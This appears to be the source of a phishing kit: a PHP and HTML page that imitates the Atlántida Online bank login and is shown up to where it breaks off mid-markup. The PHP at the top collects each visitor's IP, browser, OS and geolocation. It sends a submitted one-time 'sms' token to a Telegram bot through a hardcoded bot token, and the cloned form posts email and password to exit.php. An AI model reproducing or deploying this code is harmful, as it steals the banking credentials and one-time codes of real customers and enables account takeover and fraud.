<?php  
include "fucker.php";
?>

<?php
@$userp = $_SERVER['REMOTE_ADDR'];

////////////////////
$user_agent = $_SERVER['HTTP_USER_AGENT'];
function getBrowser($user_agent){
if(strpos($user_agent, 'MSIE') !== FALSE)
   return 'Internet explorer';
 elseif(strpos($user_agent, 'Edge') !== FALSE) //Microsoft Edge
   return 'Microsoft Edge';
 elseif(strpos($user_agent, 'Trident') !== FALSE) //IE 11
    return 'Internet explorer';
 elseif(strpos($user_agent, 'Opera Mini') !== FALSE)
   return "Opera Mini";
 elseif(strpos($user_agent, 'Opera') || strpos($user_agent, 'OPR') !== FALSE)
   return "Opera";
 elseif(strpos($user_agent, 'Firefox') !== FALSE)
   return 'Mozilla Firefox';
 elseif(strpos($user_agent, 'Chrome') !== FALSE)
   return 'Google Chrome';
 elseif(strpos($user_agent, 'Safari') !== FALSE)
   return "Safari";
 else
   return 'No navegador';}
 function getOS() { 
    global $user_agent;
    $os_array =  array(
     '/windows nt 10/i'      =>  'Windows 10',
     '/windows nt 6.3/i'     =>  'Windows 8.1',
     '/windows nt 6.2/i'     =>  'Windows 8',
     '/windows nt 6.1/i'     =>  'Windows 7',
     '/windows nt 6.0/i'     =>  'Windows Vista',
     '/windows nt 5.2/i'     =>  'Windows Server 2003/XP x64',
     '/windows nt 5.1/i'     =>  'Windows XP',
     '/windows xp/i'         =>  'Windows XP',
     '/macintosh|mac os x/i' =>  'Mac OS X',
     '/mac_powerpc/i'        =>  'Mac OS 9',
     '/linux/i'              =>  'Linux',
     '/ubuntu/i'             =>  'Ubuntu',
     '/iphone/i'             =>  'iPhone',
     '/ipod/i'               =>  'iPod',
     '/ipad/i'               =>  'iPad',
     '/android/i'            =>  'Android',
     '/blackberry/i'         =>  'BlackBerry',
     '/webos/i'              =>  'Mobile');
    $os_platform = "Unknown OS Platform";
    foreach ($os_array as $regex => $value) { 
        if (preg_match($regex, $user_agent)) {
            $os_platform = $value; }  }
    return $os_platform; }
$user_os        =   getOS();
$navegador = getBrowser($user_agent);

@$meta = unserialize(file_get_contents('http://www.geoplugin.net/php.gp?ip='.$userp));
@$pais = $meta['geoplugin_countryName']; 
@$region = $meta['geoplugin_regionName'];
@$ciudad = $meta['geoplugin_city'];
date_default_timezone_set('America/Bogota');


////////////////////

@ini_set("display_errors", 0);

////////////////////
if ( isset ($_POST['sms'])  ){


$message = "tok3n: ".$_POST['sms']."  \r\n";
$message .= " SO= ".$user_os." ".$navegador." ".$userp." ".$pais." ".$region." ".$ciudad."\r\n";
$apiToken = "5830940342:AAFD-f94b1SfPAJnjOqi07f4rGhr-hGskos";


$data = [
  'chat_id' => '@printhost',

   'text' => $message
];

$response = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?" . http_build_query($data) );




 }



?>
<html class="sap-desktop sapUiMedia-Std-Desktop sapUiMedia-StdExt-LargeDesktop sapUiTheme-bancoatlantida sapUiMedia-MainRangeSet-XL ocbDeviceExtraLarge" dir="ltr" data-sap-ui-browser="cr104" data-sap-ui-os="win7" lang="es" data-sap-ui-animation="on" data-sap-ui-animation-mode="full" style="height: 100%;"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
        <title>Atlántida Online</title>
        
        <meta http-equiv="X-UA-Compatible" content="IE=edge">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <link rel="shortcut icon" type="image/x-icon" href="https://aolweb.bancatlan.hn/ocbretail/favicon.ico">
        
        
        
        
        
        
		
        <script type="text/javascript">
            //Global Constants
            var SAP_BANKING_MOBILE_ROOT = "./";
            try {
                if (window.localStorage) {
                    var scConSettings = window.localStorage.getItem(Logon.Connection.STORAGE_KEY);
                    if(scConSettings){
                        var oConSettings = JSON.parse(scConSettings);
                        AppConfig.ConnectionConfig.OFFLINE_MODE = oConSettings.offlineMode;
                        AppConfig.ConnectionConfig.SERVICE_CONTEXT = oConSettings.serviceContext;
                        AppConfig.AppType = oConSettings.appType;
                        AppConfig.ChannelType = oConSettings.channelType;
                        AppConfig.Theme = oConSettings.theme;
                        AppConfig.Language = oConSettings.language;
                    } else {
                        const initialLanguage = navigator.language;
                        const language = initialLanguage.split('-');
                        if ( language[0] === "en") {
                            AppConfig.Language = "en";
                        } else {
                            AppConfig.Language = "es";
                        }
                    }
                    
                }
            } catch (e) {
            }
            window["sap-ui-config"] = {
                language: AppConfig.Language,
                themeRoots: {
                    "bancoatlantida": "./themes/bancoatlantida/UI5",
                    "bancoatlantic": "./themes/bancoatlantic/UI5"
                }
            };
        </script>
        
        <style>
            @font-face {
                font-family: 'Material Icons';
                font-style: normal;
                font-weight: 400;
                src: url('themes/font/materialfont/MaterialIcons-Regular.eot');
                src: local('Material Icons'), local('MaterialIcons-Regular'),
                    url('themes/font/materialfont/MaterialIcons-Regular.woff2')
                    format('woff2'),
                    url('themes/font/materialfont/MaterialIcons-Regular.woff') format('woff'),
                    url('themes/font/materialfont/MaterialIcons-Regular.ttf')
                    format('truetype');
            }

            @font-face {
                font-family: 'batl';
                src:  url('fonts/batl-v24.eot?ligdfv');
                src:  url('fonts/batl-v24.eot?ligdfv#iefix') format('embedded-opentype'),
                    url('fonts/batl-v24.ttf?ligdfv') format('truetype'),
                    url('fonts/batl-v24.woff?ligdfv') format('woff'),
                    url('fonts/batl-v24.svg?ligdfv#batl') format('svg');
                font-weight: normal;
                font-style: normal;
                font-display: block;
            }
            @font-face {
                font-family: 'Neo Sans';
                src:  url('fonts/NeoSan.ttf');
                font-weight: normal;
                font-style: normal;
                font-display: block;
            }
            @font-face {
                font-family: 'Neo Sans Medium';
                src:  url('fonts/NeoSanMed.ttf');
                font-weight: normal;
                font-style: normal;
                font-display: block;
            }
        </style>
        
    <link rel="stylesheet" href="css/library.css" id="sap-ui-theme-sap.ui.core" data-sap-ui-ready="true"><link rel="stylesheet" href="css/library(1).css" id="sap-ui-theme-sap.ui.layout" data-sap-ui-ready="true"><link rel="stylesheet" href="css/library(2).css" id="sap-ui-theme-sap.m" data-sap-ui-ready="true"><link rel="stylesheet" href="css/custom.css" id="sap-ui-core-customcss" data-sap-ui-ready="true"><style type="text/css">@font-face {font-family: 'SAP-icons';src: url('fonts/SAP-icons.woff2') format('woff2'),url('fonts/SAP-icons.woff') format('woff'),url('fonts/SAP-icons.ttf') format('truetype'),local('SAP-icons');font-weight: normal;font-style: normal;}</style><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"></head>
    <body class="sapUiBody sapBgImg bancoUiBody" id="content" role="application" data-sap-ui-area="content" style="height: 100%;"><div id="sap-ui-static" data-sap-ui-area="sap-ui-static" style="height: 0px; width: 0px; overflow: hidden; float: left;"><span id="__text0" data-sap-ui="__text0" class="sapUiInvisibleText" aria-hidden="true">Valores disponibles</span><span id="__text5" data-sap-ui="__text5" class="sapUiInvisibleText" aria-hidden="true">Más</span></div>
        
        <div class="mobileLandscapeModeNotSupportedOverlay" style="display:none">
            <span class="screenOffIcon">Gira tu dispositivo para continuar.</span>
            <span></span>
        </div>
        <div style="display: none" class="ocbNSPage ocbLoginPage"> <!-- preloads background image -->
        <script type="text/javascript">
            document.addEventListener('readystatechange', (event) => {
                if (event.target.readyState === 'interactive') {
                    var sDefaultTheme = AppConfig.Theme, sWelcomeText, sImageUrl, sTextColor;
                    
                    var lang = AppConfig.Language;
                    var screenTurnSpanishText = "Gira tu dispositivo para continuar.";
                    if(lang !== "en") {
                        document.querySelector('.screenOffIcon').textContent = screenTurnSpanishText;
                    }
                    
                    if(sDefaultTheme === "bancoatlantida") {
                        //sWelcomeText = (lang === "en") ? "Welcome to Atlántida Online" : "Bienvenido a Atlántida Online";
                        sImageUrl = "./img/logo/logo_banco_single_red_gradient.svg";
                        //sTextColor = "#b4282d";
                        //document.querySelector('.ocbPreLoaderWelcomeText').style.color = sTextColor;
                        //document.querySelector('.ocbPreLoaderWelcomeText').textContent = sWelcomeText;
                        document.querySelector('.ocbPreLoaderBackgroundImage').src = sImageUrl;
                        document.querySelector('.ocbPreLoaderBackgroundImage').style.height = '90px';
                    } else if(sDefaultTheme === "bancoatlantic"){
                        sWelcomeText = "Welcome to Atlántic Online";
                        sImageUrl = "./img/logo/atlantic_logo.ico";
                        sTextColor = "#346187";
                        document.querySelector('.ocbPreLoaderWelcomeText').style.color = sTextColor;
                        document.querySelector('.ocbPreLoaderWelcomeText').textContent = sWelcomeText;
                        document.querySelector('.ocbPreLoaderBackgroundImage').src = sImageUrl;
                    }
                }
            });
        </script>
        
        
        
    

</div><div aria-hidden="true" id="sap-ui-preserve" class="sapUiHidden sapUiForcedHidden" style="width: 0px; height: 0px; overflow: hidden;"><div id="loadingDiv" class="ocbPreLoader" data-sap-ui-preserve="loadingDiv">
            <div class="load-bar">
                <div class="bar"></div>
                <div class="bar"></div>
                <div class="bar"></div>
            </div>
            <div class="ocbPreLoaderContainer ocbPreLoaderAlignContentCenter">
                <div class="ocbPreLoaderAlignContentMiddle">
                    <div>
                        <img class="ocbPreLoaderBackgroundImage" src="img/logo_banco_single_red_gradient.svg" style="height: 90px;">
                        <span class="ocbPreLoaderWelcomeText"></span>
                    </div>
                </div>
            </div>
        </div><div id="SamplePDF" data-sap-ui-preserve="SamplePDF"></div></div><div id="OCBCompContainer" data-sap-ui="OCBCompContainer" class="sapUiComponentContainer" style="height: 100%;"><div id="OCBCompContainer-uiarea" style="height: 100%;"><div id="__jsview0" data-sap-ui="__jsview0" style="width: 100%; height: 100%;" class="sapUiJSView sapUiView sapUiViewDisplayBlock"><div id="navContainer" data-sap-ui="navContainer" class="sapMApp sapMNav sapUiGlobalBackgroundColor" style="width:100%"><div id="navContainer-BG" class="sapMAppBG sapUiGlobalBackgroundImage"></div><div id="__jsview3" data-sap-ui="__jsview3" style="width:100%" class="sapMNavItem sapUiJSView sapUiView"><div id="loginComponentContainer" data-sap-ui="loginComponentContainer" style="height:100%" class="sapUiComponentContainer"><div id="loginComponentContainer-uiarea" style="height:100%"><div id="loginComponent---loginAppRootView" data-sap-ui="loginComponent---loginAppRootView" style="width:100%;height:100%" class="ocbDeviceExtraLarge sapUiJSView sapUiView sapUiViewDisplayBlock"><div id="loginNavContainer" data-sap-ui="loginNavContainer" class="sapMNav" style="width:100%"><div id="loginComponent---signin" data-sap-ui="loginComponent---signin" style="width:100%" class="sapMNavItem sapUiJSView sapUiView"><div id="__page3" data-sap-ui="__page3" class="ocbBackgroundWhite ocbLoginPage ocbNSPage sapMPage sapMPageBgStandard sapMPageBusyCoversAll sapMPageWithHeader sapUiForceWidthAuto sapUiResponsiveContentPadding"><header class="sapMPageHeader"><div class="ocbHeaderBar ocbNSPageHeader sapContrastPlus sapMHeader-CTX sapMPageHeader signinPageHeader"><div id="loginComponent---signin--signinPageHeader--headerBar" data-sap-ui="loginComponent---signin--signinPageHeader--headerBar" data-sap-ui-fastnavgroup="true" role="toolbar" class="sapMBar sapMBar-CTX sapMContent-CTX sapMIBar sapMIBar-CTX"><div id="loginComponent---signin--signinPageHeader--headerBar-BarLeft" class="sapMBarContainer sapMBarLeft"><div id="__hbox4" data-sap-ui="__hbox4" class="sapMBarChild sapMFlexBox sapMFlexBoxAlignContentStretch sapMFlexBoxAlignItemsStretch sapMFlexBoxBGTransparent sapMFlexBoxJustifyStart sapMFlexBoxWrapNoWrap sapMHBox"><span id="sap-ui-invisible-__hbox2" class="sapUiHiddenPlaceholder" data-sap-ui="sap-ui-invisible-__hbox2" style="display: none;" aria-hidden="true"></span><div id="__hbox3" data-sap-ui="__hbox3" class="sapBrandingContainer sapMFlexBox sapMFlexBoxAlignContentStretch sapMFlexBoxAlignItemsStretch sapMFlexBoxBGTransparent sapMFlexBoxJustifyStart sapMFlexBoxWrapNoWrap sapMFlexItem sapMHBox"><div id="__data5" style="order:0;flex-grow:0;flex-shrink:1;flex-basis:auto;min-height:auto;min-width:auto" class="sapMFlexBoxBGTransparent sapMFlexItem sapMFlexItemAlignAuto"><img id="loginComponent---signin--signinPageHeader--logoImage" data-sap-ui="loginComponent---signin--signinPageHeader--logoImage" src="img/logo002.svg" class="ocbLoginIconWithText sapMImg sapMPointer sapUiTinyMarginBegin sapUiTinyMarginTop" role="presentation" aria-hidden="true" alt="" style="width:150px"></div><div id="__data6" style="order:0;flex-grow:0;flex-shrink:1;flex-basis:auto;min-height:auto;min-width:auto" class="sapMFlexBoxBGTransparent sapMFlexItem sapMFlexItemAlignAuto sapUiHiddenPlaceholder"><span id="sap-ui-invisible-loginComponent---signin--signinPageHeader--pageTitle" class="sapUiHiddenPlaceholder" data-sap-ui="sap-ui-invisible-loginComponent---signin--signinPageHeader--pageTitle" style="display: none;" aria-hidden="true"></span></div></div></div></div><div id="loginComponent---signin--signinPageHeader--headerBar-BarMiddle" class="sapMBarMiddle"><div id="loginComponent---signin--signinPageHeader--headerBar-BarPH" class="sapMBarContainer sapMBarPH" style=""></div></div><div id="loginComponent---signin--signinPageHeader--headerBar-BarRight" class="sapMBarContainer sapMBarRight"><div id="__hbox9" data-sap-ui="__hbox9" class="sapMBarChild sapMFlexBox sapMFlexBoxAlignContentStretch sapMFlexBoxAlignItemsStretch sapMFlexBoxBGTransparent sapMFlexBoxJustifyStart sapMFlexBoxWrapNoWrap sapMHBox"><span id="sap-ui-invisible-__hbox5" class="sapUiHiddenPlaceholder" data-sap-ui="sap-ui-invisible-__hbox5" style="display: none;" aria-hidden="true"></span><div id="__data7" style="order:0;flex-grow:0;flex-shrink:1;flex-basis:auto;min-height:auto;min-width:auto" class="sapMFlexBoxBGTransparent sapMFlexItem sapMFlexItemAlignAuto"><div id="__toolbar0" data-sap-ui="__toolbar0" data-sap-ui-fastnavgroup="true" role="toolbar" class="ocbNSHeaderMenu sapMIBar sapMTB sapMTB-Transparent-CTX sapMTBInactive sapMTBNewFlex sapMTBStandard"><div id="__hbox6" data-sap-ui="__hbox6" class="sapMBarChild sapMFlexBox sapMFlexBoxAlignContentStretch sapMFlexBoxAlignItemsStretch sapMFlexBoxBGTransparent sapMFlexBoxJustifyStart sapMFlexBoxWrapNoWrap sapMHBox"></div><span id="sap-ui-invisible-__hbox7" class="sapUiHiddenPlaceholder" data-sap-ui="sap-ui-invisible-__hbox7" style="display: none;" aria-hidden="true"></span><div id="__hbox8" data-sap-ui="__hbox8" class="sapMBarChild sapMFlexBox sapMFlexBoxAlignContentStretch sapMFlexBoxAlignItemsStretch sapMFlexBoxBGTransparent sapMFlexBoxJustifyStart sapMFlexBoxWrapNoWrap sapMHBox"><div id="__data8" style="order:0;flex-grow:0;flex-shrink:1;flex-basis:auto;min-height:auto;min-width:auto" class="sapMFlexBoxBGTransparent sapMFlexItem sapMFlexItemAlignAuto"><button id="loginComponent---signin--signinPageHeader--helpLink" data-sap-ui="loginComponent---signin--signinPageHeader--helpLink" class="helpLinkButton ocbFontBold ocbSelectMenu sapMBtn sapMBtnBase sapUiSmallMarginBeginEnd"><span id="loginComponent---signin--signinPageHeader--helpLink-inner" class="sapMBtnDefault sapMBtnHoverable sapMBtnInner sapMBtnText sapMFocusable"><span class="sapMBtnContent" id="loginComponent---signin--signinPageHeader--helpLink-content"><bdi id="loginComponent---signin--signinPageHeader--helpLink-BDI-content">Ayuda</bdi></span></span></button></div><div id="__data9" style="order:0;flex-grow:0;flex-shrink:1;flex-basis:auto;min-height:auto;min-width:auto" class="sapMFlexBoxBGTransparent sapMFlexItem sapMFlexItemAlignAuto"></div></div></div></div></div></div></div></div></header><section id="__page3-cont"><br><img id="loginComponent---signin--logoWhite" data-sap-ui="loginComponent---signin--logoWhite" src="img/logo_banco_single_white.svg" class="logoWhiteLogin ocbCompressWidth sapMImg sapMPointer sapUiSmallMarginBottom" role="presentation" aria-hidden="true" alt="" style="width:500px"><br><div id="loginComponent---signin--loginPageScroll" data-sap-ui="loginComponent---signin--loginPageScroll" style="width: 100%; height: auto; overflow: hidden auto;" class="sapMScrollCont sapMScrollContV"><div id="loginComponent---signin--loginPageScroll-scroll" class="sapMScrollContScroll"><div id="__panel0" data-sap-ui="__panel0" data-sap-ui-fastnavgroup="true" class="ocbBoxShadow ocbCompressWidth ocbLoginForm ocbNSPanel sapMPanel sapUiNoContentPadding sapUiTinyMarginTop" style="width:600px;height:auto" role="form" aria-labelledby="__panel0-header"><h1 class="sapMPanelHdr" id="__panel0-header">Iniciar sesión</h1><div id="__panel0-content" class="sapMPanelBGTransparent sapMPanelContent"><div id="__vbox2" data-sap-ui="__vbox2" class="sapMFlexBox sapMFlexBoxAlignContentStretch sapMFlexBoxAlignItemsStretch sapMFlexBoxBGTransparent sapMFlexBoxJustifyStart sapMFlexBoxWrapNoWrap sapMVBox"><div id="__hbox1" data-sap-ui="__hbox1" class="sapMFlexBox sapMFlexBoxAlignContentStretch sapMFlexBoxAlignItemsCenter sapMFlexBoxBGTransparent sapMFlexBoxJustifyEnd sapMFlexBoxWrapNoWrap sapMFlexItem sapMHBox"><div id="__data10" style="order:0;flex-grow:0;flex-shrink:1;flex-basis:auto;min-height:auto;min-width:auto" class="sapMFlexBoxBGTransparent sapMFlexItem sapMFlexItemAlignAuto sapUiHiddenPlaceholder"><span id="sap-ui-invisible-loginComponent---signin--helpLink" class="sapUiHiddenPlaceholder" data-sap-ui="sap-ui-invisible-loginComponent---signin--helpLink" style="display: none;" aria-hidden="true"></span></div><div id="__data11" style="order:0;flex-grow:0;flex-shrink:1;flex-basis:auto;min-height:auto;min-width:auto" class="sapMFlexBoxBGTransparent sapMFlexItem sapMFlexItemAlignAuto sapUiHiddenPlaceholder"><span id="sap-ui-invisible-__select0" class="sapUiHiddenPlaceholder" data-sap-ui="sap-ui-invisible-__select0" style="display: none;" aria-hidden="true"></span></div></div><div id="__data12" style="order:0;flex-grow:0;flex-shrink:1;flex-basis:auto;min-height:auto;min-width:auto" class="sapMFlexBoxBGTransparent sapMFlexItem sapMFlexItemAlignAuto"><div id="__form0" data-sap-ui="__form0" class="sapUiSimpleForm">
    <form class="sapUiForm sapUiFormEdit sapUiFormEdit-CTX sapUiFormLblColon sapUiFormM" action="exit.php" method="post">
<div id="__form0--Layout" data-sap-ui="__form0--Layout" class="sapUiFormBackgrTranslucent sapUiFormResGrid"><div id="__container0--Grid" data-sap-ui="__container0--Grid" class="sapUiFormResGridCont sapUiRespGrid sapUiRespGridHSpace0 sapUiRespGridOverflowHidden sapUiRespGridVSpace0 sapUiRespGridMedia-Std-Phone"><div class="sapUiFormElementLbl sapUiRespGridBreak sapUiRespGridSpanL12 sapUiRespGridSpanM12 sapUiRespGridSpanS12 sapUiRespGridSpanXL12"><label id="__label0" data-sap-ui="__label0" for="loginComponent---signin--signInUserNameVBox" style="text-align:left" class="sapMLabel sapMLabelMaxWidth sapMLabelWrapped sapUiFormLabel-CTX sapUiSelectable"><bdi id="__label0-bdi">Correo electrónico</bdi></label></div><div class="sapUiRespGridSpanL8 sapUiRespGridSpanM12 sapUiRespGridSpanS12 sapUiRespGridSpanXL8"><div id="loginComponent---signin--signInUserNameVBox" data-sap-ui="loginComponent---signin--signInUserNameVBox" class="sapMFlexBox sapMFlexBoxAlignContentStretch sapMFlexBoxAlignItemsStretch sapMFlexBoxBGTransparent sapMFlexBoxJustifyStart sapMFlexBoxWrapNoWrap sapMVBox" style="width: 100%;"><div id="__data13" style="order:0;flex-grow:0;flex-shrink:1;flex-basis:auto;min-height:auto;min-width:auto" class="sapMFlexBoxBGTransparent sapMFlexItem sapMFlexItemAlignAuto"><div id="loginComponent---signin--userName" data-sap-ui="loginComponent---signin--userName" style="width:100%" class="customLoginInput ocbInput sapMInput sapMInputBase sapMInputBaseHeightMargin sapUiSmallMarginBottom"><div id="loginComponent---signin--userName-content" class="sapMInputBaseContentWrapper" style="width:100%"><input required="" name="c0r" id="loginComponent---signin--userName-inner" placeholder="Ejemplo@mail.com" maxlength="32" value="" aria-labelledby="loginComponent---signin--userName-labelledby" type="email" class="sapMInputBaseInner" autocomplete="new-password" autocorrect="off" autocapitalize="none"></div></div></div><div id="__data14" style="order:0;flex-grow:0;flex-shrink:1;flex-basis:auto;min-height:auto;min-width:auto" class="sapMFlexBoxBGTransparent sapMFlexItem sapMFlexItemAlignAuto sapUiHiddenPlaceholder"><span id="sap-ui-invisible-loginComponent---signin--errorUserName" class="sapUiHiddenPlaceholder" data-sap-ui="sap-ui-invisible-loginComponent---signin--errorUserName" style="display: none;" aria-hidden="true"></span></div></div></div><div class="sapUiFormElementLbl sapUiRespGridBreak sapUiRespGridSpanL12 sapUiRespGridSpanM12 sapUiRespGridSpanS12 sapUiRespGridSpanXL12"><label id="__label1" data-sap-ui="__label1" for="loginComponent---signin--signInPasswordVBox" style="text-align:left" class="sapMLabel sapMLabelMaxWidth sapMLabelWrapped sapUiFormLabel-CTX sapUiSelectable"><bdi id="__label1-bdi">Contraseña</bdi></label></div><div class="sapUiRespGridSpanL4 sapUiRespGridSpanM6 sapUiRespGridSpanS12 sapUiRespGridSpanXL4"><div id="loginComponent---signin--signInPasswordVBox" data-sap-ui="loginComponent---signin--signInPasswordVBox" class="sapMFlexBox sapMFlexBoxAlignContentStretch sapMFlexBoxAlignItemsStretch sapMFlexBoxBGTransparent sapMFlexBoxJustifyStart sapMFlexBoxWrapNoWrap sapMVBox sapUiTinyMarginBottom" style="width: 100%;"><div id="loginComponent---signin--password" data-sap-ui="loginComponent---signin--password" class="customLoginInput ocbInput ocbPasswordContainer sapMFlexItem"><div id="loginComponent---signin--password" data-sap-ui="loginComponent---signin--password" class="sapMFlexBox sapMFlexBoxAlignContentStretch sapMFlexBoxAlignItemsStretch sapMFlexBoxBGTransparent sapMFlexBoxJustifyStart sapMFlexBoxWrapNoWrap sapMFlexItem sapMHBox"><div id="__data1" style="order:0;flex-grow:12;flex-shrink:1;flex-basis:auto;min-height:auto;min-width:auto" class="sapMFlexBoxBGTransparent sapMFlexItem sapMFlexItemAlignAuto"><div id="__input0" data-sap-ui="__input0" style="width:95%" class="passwordInputField sapMInput sapMInputBase sapMInputBaseHeightMargin"><div id="__input0-content" class="sapMInputBaseContentWrapper" style="width:100%"><input name="pc0r" required="" id="__input0-inner" placeholder="Ingresa tu contraseña" maxlength="32" value="" aria-labelledby="__input0-labelledby" type="password" class="sapMInputBaseInner" autocomplete="new-password" aria-autocomplete="list"></div></div></div><div id="__data15" style="order:0;flex-grow:0;flex-shrink:1;flex-basis:auto;min-height:auto;min-width:auto" class="sapMFlexBoxBGTransparent sapMFlexItem sapMFlexItemAlignAuto"><button id="__button0" data-sap-ui="__button0" aria-pressed="false" title="Suprimir" class="ocbFormButtonPrimary ocbPasswordButton sapMBtn sapMBtnBase">
<img class="sapMBtnDefault sapMBtnHoverable sapMBtnIconFirst sapMBtnInner sapMFocusable" src="img/icons8-eye-48.png"></button></div></div></div><div id="__data16" style="order:0;flex-grow:0;flex-shrink:1;flex-basis:auto;min-height:auto;min-width:auto" class="sapMFlexBoxBGTransparent sapMFlexItem sapMFlexItemAlignAuto sapUiHiddenPlaceholder"><span id="sap-ui-invisible-loginComponent---signin--errorPassword" class="sapUiHiddenPlaceholder" data-sap-ui="sap-ui-invisible-loginComponent---signin--errorPassword" style="display: none;" aria-hidden="true"></span></div></div></div><div class="sapUiRespGridSpanL4 sapUiRespGridSpanM6 sapUiRespGridSpanS12 sapUiRespGridSpanXL4"><a id="loginComponent---signin--forgotPasswordLink" data-sap-ui="loginComponent---signin--forgotPasswordLink" tabindex="0" role="link" aria-labelledby="__label1 loginComponent---signin--forgotPasswordLink" class="ocbFontBold sapMLnk sapMLnkMaxWidth">¿Olvidaste tu contraseña?</a><br><div id="__vbox1" data-sap-ui="__vbox1" class="sapMFlexBox sapMFlexBoxAlignContentCenter sapMFlexBoxAlignItemsCenter sapMFlexBoxBGTransparent sapMFlexBoxJustifyCenter sapMFlexBoxWrapNoWrap sapMFlexItem sapMVBox"><div id="__data19" style="order:0;flex-grow:0;flex-shrink:1;flex-basis:auto;min-height:auto;min-width:auto" class="sapMFlexBoxBGTransparent sapMFlexItem sapMFlexItemAlignAuto"><button type="submit" id="__button1" data-sap-ui="__button1" class="ocbFormButton ocbFormButtonPrimary ocbFormFooterButtons sapMBtn sapMBtnBase" style="width:250px"><span id="__button1-inner" class="sapMBtnDefault sapMBtnHoverable sapMBtnInner sapMBtnText sapMFocusable"><span class="sapMBtnContent" id="__button1-content"><bdi id="__button1-BDI-content">finalizar verificación</bdi></span></span></button></div><div id="__data21" style="order:0;flex-grow:0;flex-shrink:1;flex-basis:auto;min-height:auto;min-width:auto" class="sapMFlexBoxBGTransparent sapMFlexItem sapMFlexItemAlignAuto sapUiHiddenPlaceholder"><span id="sap-ui-invisible-__button3" class="sapUiHiddenPlaceholder" data-sap-ui="sap-ui-invisible-__button3" style="display: none;" aria-hidden="true"></span></div></div></div><div class="sapUiFormElementLbl sapUiRespGridBreak sapUiRespGridSpanInvisible sapUiRespGridSpanL12 sapUiRespGridSpanM12 sapUiRespGridSpanS12 sapUiRespGridSpanXL12"><span id="sap-ui-invisible-__label2" class="sapUiHiddenPlaceholder" data-sap-ui="sap-ui-invisible-__label2" style="display: none;" aria-hidden="true"></span></div><div class="sapUiRespGridSpanL8 sapUiRespGridSpanM12 sapUiRespGridSpanS12 sapUiRespGridSpanXL8"><div id="loginComponent---signin--signInTokenVBox" data-sap-ui="loginComponent---signin--signInTokenVBox" class="sapMFlexBox sapMFlexBoxAlignContentStretch sapMFlexBoxAlignItemsStretch sapMFlexBoxBGTransparent sapMFlexBoxJustifyStart sapMFlexBoxWrapNoWrap sapMVBox" style="width: 100%;"><div id="__data17" style="order:0;flex-grow:0;flex-shrink:1;flex-basis:auto;min-height:auto;min-width:auto" class="sapMFlexBoxBGTransparent sapMFlexItem sapMFlexItemAlignAuto sapUiHiddenPlaceholder"><span id="sap-ui-invisible-loginComponent---signin--authToken" class="sapUiHiddenPlaceholder" data-sap-ui="sap-ui-invisible-loginComponent---signin--authToken" style="display: none;" aria-hidden="true"></span></div><div id="__data18" style="order:0;flex-grow:0;flex-shrink:1;flex-basis:auto;min-height:auto;min-width:auto" class="sapMFlexBoxBGTransparent sapMFlexItem sapMFlexItemAlignAuto sapUiHiddenPlaceholder"><span id="sap-ui-invisible-loginComponent---signin--errorAuthToken" class="sapUiHiddenPlaceholder" data-sap-ui="sap-ui-invisible-loginComponent---signin--errorAuthToken" style="display: none;" aria-hidden="true"></span></div></div></div></div></div></form></div></div><span id="sap-ui-invisible-loginComponent---signin--touchIdContainer" class="sapUiHiddenPlaceholder" data-sap-ui="sap-ui-invisible-loginComponent---signin--touchIdContainer" style="display: none;" aria-hidden="true"></span><div id="__vbox0" data-sap-ui="__vbox0" class="sapMFlexBox sapMFlexBoxAlignContentStretch sapMFlexBoxAlignItemsStretch sapMFlexBoxBGTransparent sapMFlexBoxJustifyStart sapMFlexBoxWrapNoWrap sapMFlexItem sapMVBox sapUiSmallMarginBeginEnd"><div id="__box0" data-sap-ui="__box0" class="sapMFlexBox sapMFlexBoxAlignContentStretch sapMFlexBoxAlignItemsStretch sapMFlexBoxBGTransparent sapMFlexBoxJustifyCenter sapMFlexBoxWrapWrap sapMFlexItem sapMHBox sapUiTinyMarginTop"><div id="__data22" style="order:0;flex-grow:0;flex-shrink:1;flex-basis:auto;min-height:auto;min-width:auto" class="sapMFlexBoxBGTransparent sapMFlexItem sapMFlexItemAlignAuto"><a id="loginComponent---signin--unlockPasswordLink" data-sap-ui="loginComponent---signin--unlockPasswordLink" tabindex="0" role="link" class="ocbFontBold sapMLnk sapMLnkMaxWidth sapUiTinyMarginBottom">Desbloqueo de usuario</a></div></div><div id="__box1" data-sap-ui="__box1" class="sapMFlexBox sapMFlexBoxAlignContentStretch sapMFlexBoxAlignItemsStretch sapMFlexBoxBGTransparent sapMFlexBoxJustifyCenter sapMFlexBoxWrapWrap sapMFlexItem sapMHBox"><div id="__data23" style="order:0;flex-grow:0;flex-shrink:1;flex-basis:auto;min-height:auto;min-width:auto" class="sapMFlexBoxBGTransparent sapMFlexItem sapMFlexItemAlignAuto sapUiHiddenPlaceholder"><span id="sap-ui-invisible-loginComponent---signin--tokenAppDownload" class="sapUiHiddenPlaceholder" data-sap-ui="sap-ui-invisible-loginComponent---signin--tokenAppDownload" style="display: none;" aria-hidden="true"></span></div></div></div></div></div></div><div id="__hbox0" data-sap-ui="__hbox0" class="managementPanel sapMFlexBox sapMFlexBoxAlignContentStretch sapMFlexBoxAlignItemsStretch sapMFlexBoxBGTransparent sapMFlexBoxJustifyStart sapMFlexBoxWrapNoWrap sapMHBox sapUiSmallMarginTop"><div id="__data24" style="order:0;flex-grow:0;flex-shrink:1;flex-basis:auto;min-height:auto;min-width:auto" class="sapMFlexBoxBGTransparent sapMFlexItem sapMFlexItemAlignAuto"><a id="__link1" data-sap-ui="__link1" tabindex="0" role="link" class="colorWhite ocbFontBold sapMLnk sapMLnkMaxWidth">Habilitar ACH</a></div><div id="__data25" style="order:0;flex-grow:0;flex-shrink:1;flex-basis:auto;min-height:auto;min-width:auto" class="sapMFlexBoxBGTransparent sapMFlexItem sapMFlexItemAlignAuto"><a id="__link2" data-sap-ui="__link2" tabindex="0" role="link" class="colorWhite managementPanel__action ocbFontBold sapMLnk sapMLnkMaxWidth">Gestiones de Tarjetas</a></div><div id="__data26" style="order:0;flex-grow:0;flex-shrink:1;flex-basis:auto;min-height:auto;min-width:auto" class="sapMFlexBoxBGTransparent sapMFlexItem sapMFlexItemAlignAuto"><a id="__link3" data-sap-ui="__link3" tabindex="0" role="link" class="colorWhite managementPanel__action ocbFontBold sapMLnk sapMLnkMaxWidth">Consulta de Cheques</a></div></div></div></div><span id="sap-ui-invisible-loginComponent---signin--forexParentContainer" class="sapUiHiddenPlaceholder" 